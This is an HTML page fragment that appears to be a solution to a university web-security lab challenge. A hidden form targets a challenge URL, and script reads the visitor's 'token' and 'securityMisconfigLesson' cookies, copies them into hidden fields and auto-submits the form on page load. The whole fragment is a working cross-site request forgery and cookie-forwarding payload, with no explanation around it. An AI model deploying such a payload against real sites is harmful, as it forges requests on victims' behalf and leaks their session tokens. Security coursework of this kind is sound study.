<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/challenges/s74a796e84e25b854906d88f622170c1c06817e72b526b3d1e9a6085f429cf52" method="POST">
    <input id="tokenid" type="hidden" name="csrfToken"/>
    <input id="msgid" type="hidden" name="myMessage"/>
    <input type="submit"/>
</form>

<script>
    function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        console.log(decodedCookie)
        var ca = decodedCookie.split(';');
        for(var i = 0; i <ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return cname + " not found";
    }
    document.getElementById("tokenid").value = getCookie("token")
    document.getElementById("msgid").value = getCookie("securityMisconfigLesson")
    document.getElementById("antmoForm3").submit();
</script>
